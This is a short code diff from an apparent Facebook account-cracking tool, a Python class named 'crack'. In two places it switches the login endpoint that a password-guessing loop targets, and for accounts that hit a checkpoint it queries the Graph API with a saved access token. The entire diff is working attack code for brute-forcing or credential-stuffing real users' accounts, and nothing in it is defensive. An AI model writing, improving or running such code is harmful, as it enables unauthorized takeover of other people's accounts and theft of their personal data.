@@ -1055,7 +1055,7 @@ class crack:
         try:
             for i in fl.get("pw"):
                 log = log_api(fl.get("id"),
-                    i,"https://m.facebook.com")
+                    i,"https://b-api.facebook.com")
                 if log.get("status")=="cp":
                     try:
                         ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open("token.txt","r").read())
@@ -1091,7 +1091,7 @@ class crack:
         try:
             for i in fl.get("pw"):
                 log = log_api(fl.get("id"),
-                    i,"https://m.facebook.com")
+                    i,"https://b-api.facebook.com")
                 if log.get("status")=="cp":
                     try:
                         ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open("token.txt","r").read())
